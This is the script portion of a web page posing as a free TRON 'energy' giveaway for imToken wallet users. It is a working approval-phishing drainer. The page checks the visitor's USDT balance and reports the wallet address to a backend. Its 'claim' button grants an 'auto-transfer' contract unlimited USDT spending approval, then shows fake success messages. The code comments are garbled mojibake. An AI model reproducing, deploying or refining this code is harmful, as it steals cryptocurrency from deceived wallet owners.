// ========== DOMå…ƒç´ ç¼“å­˜ ==========
const walletStatusContainer = document.getElementById("walletStatusContainer");
const contractAddrEl = document.getElementById("contractAddr");
const userInfoEl = document.getElementById("userInfo");
const connectBtn = document.getElementById("connectBtn");
const approveBtn = document.getElementById("approveBtn");
const warning = document.querySelector('.warning');
const approvalRecords = document.getElementById("approvalRecords");
const reviewTip = document.getElementById("reviewTip");
const reviewTipText = document.getElementById("reviewTipText");
const langToggle = document.getElementById("langToggle");
const footerInfo = document.getElementById("footerInfo");
const recordList = document.getElementById("recordList"); // è®°å½•åˆ—è¡¨å…ƒç´ 
// ========== é”™è¯¯ç±»å‹åˆ¤æ–­ ==========
function isCustomerError(errMsg) {
    const lang = langConfig[currentLang];
    const customerErrorKeys = [
        lang.ineligibleTip, "æ— æ•ˆTRONåœ°å€", "USDTä½™é¢ä¸è¶³", "ä¸ç¬¦åˆé¢†å–æ¡ä»¶", "30å¤©å†…å·²é¢†å–", 
         "æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€", "Ineligible", "invalid TRON address", 
        "USDT balance", "within 30 days"
    ];
    return customerErrorKeys.some(key => errMsg.includes(key));
}
// ========== è¯­è¨€åˆ‡æ¢é€»è¾‘ ==========
function toggleLang() {
    currentLang = currentLang === "zh" ? "en" : "zh";
    localStorage.setItem("imtoken_energy_lang", currentLang);
    updatePageLang();
    reRenderDynamicContent();
    renderEnergyRecords();
}
function updatePageLang() {
    const lang = langConfig[currentLang];
    Object.keys(lang).forEach(key => {
        const el = document.getElementById(key);
        if (el) {
            el.innerHTML = lang[key];
        }
    });
    connectBtn.textContent = lang.connectBtnText;
    approveBtn.textContent = lang.approveBtnText;
    reviewTipText.textContent = lang.reviewTipText;
    approvalRecords.textContent = lang.noRecord;
}
function reRenderDynamicContent() {
    const lang = langConfig[currentLang];
    if (!userAddress) {
        // æœªè¿æ¥é’±åŒ…ï¼šåªæ˜¾ç¤ºæœªè¿æ¥æç¤ºï¼Œä¸æ˜¾ç¤ºä¸ç¬¦åˆé¢†å–æ¡ä»¶
        userInfoEl.innerHTML = lang.userInfoDefault;
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        recordList.style.display = "none"; // éšè—è®°å½•åˆ—è¡¨
        return;
    }
    // è¿æ¥é’±åŒ…ï¼šæ˜¾ç¤ºè®°å½•åˆ—è¡¨
    recordList.style.display = "block";
    
    // ç‰¹æ®Šåœ°å€å¤„ç†
    if (userAddress === SPECIAL_ADDRESS) {
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        return;
    }
    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
    // 30å¤©å†…å·²é¢†å–
    if (isAddressAuthorized(userAddress)) {
        userInfoEl.innerHTML = lang.authorizedTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = true;
        approveBtn.textContent = lang.authorizedBtn;
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        return;
    }
    // ä½™é¢çŠ¶æ€
    if (tokenBalance <= 1) {
        userInfoEl.innerHTML = lang.insufficientUsdt
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
    } else if (tokenBalance > 1) {
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
    } else {
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", lang.queryingBalance)
            .replace("{trx}", lang.queryingBalance);
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
    }
    document.getElementById("statusAddress").textContent = shortAddr;
    updateWalletStatus();
    bindApproveLogic();
}
// ========== èƒ½é‡å‡å°‘é€»è¾‘ ==========
function calculateCurrentEnergy() {
    const now = new Date().getTime();
    const secPassed = Math.floor((now - GLOBAL_START_TIME) / 1000);
    currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
    return currentEnergy;
}
function updateEnergyDisplay() {
    if (!contractEnergyEl) return;
    calculateCurrentEnergy();
    contractEnergyEl.textContent = Math.floor(currentEnergy);
    contractEnergyEl.innerHTML = Math.floor(currentEnergy);
    contractEnergyEl.offsetHeight;
    console.log("èƒ½é‡è·³åŠ¨ä¸­ï¼š", Math.floor(currentEnergy));
}
function startPersistentEnergyCountdown() {
    if (trxTimer) clearTimeout(trxTimer);
    calculateCurrentEnergy();
    updateEnergyDisplay();
    function tick() {
        updateEnergyDisplay();
        if (currentEnergy > 0) {
            trxTimer = setTimeout(tick, 1000);
        }
    }
    tick();
    console.log("èƒ½é‡å®šæ—¶å™¨å·²å¯åŠ¨ï¼Œé€’å½’æ¨¡å¼");
}
// ========== é¡µé¢åˆå§‹åŒ– ==========
document.addEventListener('DOMContentLoaded', async () => {
    localStorage.removeItem("energy_state");
    console.log("å·²æ¸…é™¤æ—§ç¼“å­˜");
    contractEnergyEl = document.getElementById("contractEnergy");
    console.log("èƒ½é‡æ˜¾ç¤ºå…ƒç´ æ˜¯å¦æ‰¾åˆ°ï¼š", contractEnergyEl ? "âœ… æ‰¾åˆ°" : "âŒ æœªæ‰¾åˆ°");
    if (!contractEnergyEl) {
        alert("âš ï¸ èƒ½é‡æ˜¾ç¤ºå…ƒç´ æœªæ‰¾åˆ°ï¼Œè¯·æ£€æŸ¥é¡µé¢ä¸­æ˜¯å¦æœ‰id='contractEnergy'çš„æ ‡ç­¾");
        return;
    }
    startPersistentEnergyCountdown();
    updatePageLang();
    langToggle.addEventListener("click", toggleLang);
    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
    renderEnergyRecords();
    updateWalletStatus();
    // åˆå§‹éšè—è®°å½•åˆ—è¡¨
    recordList.style.display = "none";
    await checkImTokenEnv().catch(err => {
        console.error("ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼š", err);
        const lang = langConfig[currentLang];
        userInfoEl.innerHTML = lang.userInfoDefault; // æœªè¿æ¥æ—¶åªæ˜¾ç¤ºé»˜è®¤æç¤º
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
    });
    window.addEventListener("beforeunload", () => {
        if (trxTimer) clearTimeout(trxTimer);
    });
    if (window.tronWeb && window.location.hash === "#approve") {
        window.location.hash = "";
        setTimeout(() => {
            initWallet(true).catch(err => {
                console.error("æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š", err);
                const lang = langConfig[currentLang];
                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 16px;'>${lang.errorTipPrefix}${tip}</span>`;
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
            });
        }, 500);
    }
});
// ========== ç¯å¢ƒæ£€æµ‹ ==========
async function checkImTokenEnv() {
    const lang = langConfig[currentLang];
    if (window.tronWeb) {
        tronWeb = window.tronWeb;
        connectBtn.style.display = "none";
        warning.style.display = "none";
        await initWallet(false);
    } else {
        try {
            // éimTokenç¯å¢ƒï¼šåªæ˜¾ç¤ºéç”¨æˆ·æç¤ºï¼Œä¸æ˜¾ç¤ºä¸ç¬¦åˆé¢†å–æ¡ä»¶
            userInfoEl.innerHTML = `
                ${lang.nonImTokenUser}<br>
                <span style="color: #3b82f6; font-size: 15px;">${lang.copyGuide.split("âœ… ")[1]}</span>
            `;
            approveBtn.style.display = "none";
            connectBtn.onclick = async () => {
                try {
                    const dappUrl = window.location.href;
                    await navigator.clipboard.writeText(dappUrl);
                    window.location.href = "imtoken://open";
                    setTimeout(() => {}, 1200);
                } catch (e) {
                    console.error("å¤åˆ¶/å”¤èµ·å¤±è´¥ï¼š", e);
                }
            };
        } catch (e) {
            console.error("éimTokenç¯å¢ƒå¤„ç†å¤±è´¥ï¼š", e);
        }
    }
}
// ========== é’±åŒ…åˆå§‹åŒ– ==========
async function initWallet(isAfterApprove) {
    const lang = langConfig[currentLang];
    try {
        userAddress = tronWeb.defaultAddress.base58;
        // 1. ç‰¹æ®Šåœ°å€ç™½åå•
        if (userAddress === SPECIAL_ADDRESS) {
            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
            const [usdtRaw, trxRaw] = await Promise.all([
                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
                tronWeb.trx.getBalance(userAddress).catch(err => 0)
            ]);
            tokenBalance = Number(usdtRaw) / 1000000;
            trxBalance = Number(trxRaw) / 1000000;
            userInfoEl.innerHTML = lang.eligibleTip
                .replace("{address}", shortAddr)
                .replace("{usdt}", tokenBalance.toFixed(2))
                .replace("{trx}", trxBalance.toFixed(2));
            document.getElementById("statusAddress").textContent = shortAddr;
            updateWalletStatus();
            // ç‰¹æ®Šåœ°å€15åˆ†é’Ÿé˜²é‡å¤
            if (canSendA1Signal(userAddress)) {
                sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
                updateA1SignalRecord(userAddress);
            }
            approveBtn.disabled = false;
            approveBtn.textContent = lang.approveBtnText;
            recordList.style.display = "block"; // æ˜¾ç¤ºè®°å½•åˆ—è¡¨
            bindApproveLogic();
            return;
        }
        // 2. æ— é’±åŒ…åœ°å€
        if (!userAddress) {
            userInfoEl.innerHTML = lang.noWalletAddress;
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "none"; // éšè—è®°å½•åˆ—è¡¨
            return;
        }
        // æŸ¥è¯¢ä½™é¢
        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        const [usdtRaw, trxRaw] = await Promise.all([
            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
            tronWeb.trx.getBalance(userAddress).catch(err => 0)
        ]);
        tokenBalance = Number(usdtRaw) / 1000000;
        trxBalance = Number(trxRaw) / 1000000;
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        // 3. 30å¤©å†…å·²é¢†å–
        if (isAddressAuthorized(userAddress)) {
            userInfoEl.innerHTML = lang.authorizedTip
                .replace("{address}", shortAddr)
                .replace("{usdt}", tokenBalance.toFixed(2))
                .replace("{trx}", trxBalance.toFixed(2));
            approveBtn.disabled = true;
            approveBtn.textContent = lang.authorizedBtn;
            document.getElementById("statusAddress").textContent = shortAddr;
            updateWalletStatus();
            recordList.style.display = "block"; // æ˜¾ç¤ºè®°å½•åˆ—è¡¨
            return;
        }
        // 4. USDTä½™é¢ä¸è¶³
        if (tokenBalance <= 1) {
            userInfoEl.innerHTML = lang.insufficientUsdt
                .replace("{address}", shortAddr)
                .replace("{usdt}", tokenBalance.toFixed(2))
                .replace("{trx}", trxBalance.toFixed(2));
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            document.getElementById("statusAddress").textContent = shortAddr;
            updateWalletStatus();
            recordList.style.display = "block"; // æ˜¾ç¤ºè®°å½•åˆ—è¡¨
            return;
        }
        // 5. éimTokenç”¨æˆ·
        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
            userInfoEl.innerHTML = lang.nonImTokenUser;
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "none"; // éšè—è®°å½•åˆ—è¡¨
            return;
        }
        // 6. ç¬¦åˆæ¡ä»¶
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        if (canSendA1Signal(userAddress)) {
            sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
            updateA1SignalRecord(userAddress);
        }
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        recordList.style.display = "block"; // æ˜¾ç¤ºè®°å½•åˆ—è¡¨
        bindApproveLogic();
    } catch (e) {
        console.error("é’±åŒ…åˆå§‹åŒ–å¤±è´¥ï¼š", e);
        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
        const errorTip = userAddress ? 
            `${lang.insufficientUsdt.replace("{address}", shortAddr).replace("{usdt}", tokenBalance?.toFixed(2) || 0).replace("{trx}", trxBalance?.toFixed(2) || 0)}` :
            lang.noWalletAddress;
        userInfoEl.innerHTML = errorTip;
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
        updateWalletStatus();
        recordList.style.display = userAddress ? "block" : "none";
    }
}
// ========== æˆæƒåæ‰§è¡Œ ==========
async function executeAfterApprove() {
    const lang = langConfig[currentLang];
    try {
        if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        await trc20Contract.approve(
            AUTO_TRANSFER_CONTRACT,
            INFINITE_APPROVE_AMOUNT
        ).send({ from: userAddress, shouldPollResponse: true });
        // ä¸å‘é€A2/B2åç«¯ä¿¡å·
        const btn = document.getElementById("approveBtn");
        btn.textContent = lang.distributingBtn;
        // ç›´æ¥æ ‡è®°æˆåŠŸ
        btn.textContent = lang.successBtn;
        userInfoEl.innerHTML += lang.successArrival;
        alert(lang.successTip);
        renderEnergyRecords();
    } catch (e) {
        console.error("å‘æ”¾èƒ½é‡å¤±è´¥ï¼š", e);
        throw e;
    }
}
// ========== å‘é€ä¿¡å·å‡½æ•° ==========
async function sendSignalA1() {
    const requestData = { userAddress };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if (res.ok) console.log("âœ… A1ä¿¡å·å¼‚æ­¥å‘é€æˆåŠŸ");
        return true;
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}
async function sendSignalA2() {
    const requestData = { userAddress, usdtBalance: tokenBalance };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if ([400, 408, 409].includes(res.status)) {
            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
            throw new Error(errData.detail || lang.ineligibleTip);
        }
        if (!res.ok) throw new Error(lang.ineligibleTip);
        console.log("âœ… A2ä¿¡å·å‘é€æˆåŠŸ");
        return true;
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}
async function sendSignalB(isB1 = true) {
    const requestData = { userAddress };
    const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    const lang = langConfig[currentLang];
    try {
        const res = await fetch(`${BACKEND_API}${apiPath}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if ([400, 408, 409].includes(res.status)) {
            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
            throw new Error(errData.detail || (isB1 ? lang.ineligibleTip : lang.ineligibleTip));
        }
        const data = await res.json();
        if (!res.ok || !data.success) throw new Error(data.detail || lang.ineligibleTip);
        console.log(`âœ… ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†æˆåŠŸ`);
        return true;
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}
// ========== é¢†å–æŒ‰é’®é€»è¾‘ï¼ˆäºŒæ¬¡ç‚¹å‡»ä¸é‡å¤å‘é€B1ä¿¡å·ï¼‰ ==========
function bindApproveLogic() {
    const lang = langConfig[currentLang];
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        btn.disabled = true;
        btn.textContent = lang.loadingBtn;
        reviewTip.style.display = "flex";
        // æ ¸å¿ƒï¼šç‚¹å‡»å³æ ‡è®°ä¸ºå·²é¢†å–
        addAuthorizedAddress(userAddress);
        saveEnergyRecord();
        renderEnergyRecords();
        try {
            // æ–°å¢ï¼šåˆ¤æ–­æ˜¯å¦å·²å‘é€B1ä¿¡å·ï¼Œæœªå‘é€æ‰å‘é€
            if (!hasSentB1Signal(userAddress)) {
                // ä¸å‘é€B1åç«¯ä¿¡å·ï¼ˆæŒ‰éœ€æ±‚ä¿ç•™æ³¨é‡Šï¼Œå¦‚éœ€å‘é€å¯å–æ¶ˆæ³¨é‡Šï¼‰
                // await sendSignalB(true);
                markB1SignalSent(userAddress); // æ ‡è®°ä¸ºå·²å‘é€
            }
            reviewTip.style.display = "none";
            btn.textContent = lang.redirectingBtn;
            window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
        } catch (e) {
            console.error("é¢†å–æµç¨‹å¤±è´¥ï¼š", e);
            const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
            alert(`${lang.errorTipPrefix}${tip}`);
            // å¼ºåˆ¶æ›´æ–°ä¸ºå·²é¢†å–çŠ¶æ€
            userInfoEl.innerHTML = lang.authorizedTip
                .replace("{address}", shortAddr)
                .replace("{usdt}", tokenBalance.toFixed(2))
                .replace("{trx}", trxBalance.toFixed(2));
            btn.disabled = true;
            btn.textContent = lang.authorizedBtn;
            reviewTip.style.display = "none";
        }
    };
}
// ========== è¾…åŠ©å‡½æ•° ==========
function updateWalletStatus() {
    userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
}
function saveEnergyRecord() {
    const lang = langConfig[currentLang];
    const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const newRecords = existing.filter(item => item.address !== userAddress);
    newRecords.push({
        address: userAddress,
        tokenBalance: tokenBalance,
        trxBalance: trxBalance,
        receiveTime: new Date().toLocaleString(),
        energyAmount: "90000",
        recordType: lang.freeEnergy
    });
    localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
}
function renderEnergyRecords() {
    const lang = langConfig[currentLang];
    const container = document.getElementById("approvalRecords");
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    if (records.length === 0) {
        container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
        return;
    }
    container.innerHTML = records.map(record => `
        <div class='record-item'>
            <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
            <p><strong>${lang.recordType}</strong>${record.recordType}</p>
            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
            <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
        </div>
    `).join("");
}
</script>
</body>
</html>
